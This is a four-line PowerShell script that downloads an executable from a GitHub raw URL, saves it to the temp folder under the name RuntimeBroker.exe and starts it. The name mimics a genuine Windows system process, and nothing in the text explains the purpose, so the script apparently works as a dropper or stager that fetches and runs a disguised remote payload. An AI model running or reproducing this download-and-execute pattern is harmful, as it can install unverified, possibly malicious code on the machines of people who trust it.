$exeUrl = "https://github.com/HyperActivated2046/Testing/raw/refs/heads/main/Dog/RuntimeBroker.exe"
$savePath = "$env:TEMP\RuntimeBroker.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $savePath
Start-Process $savePath
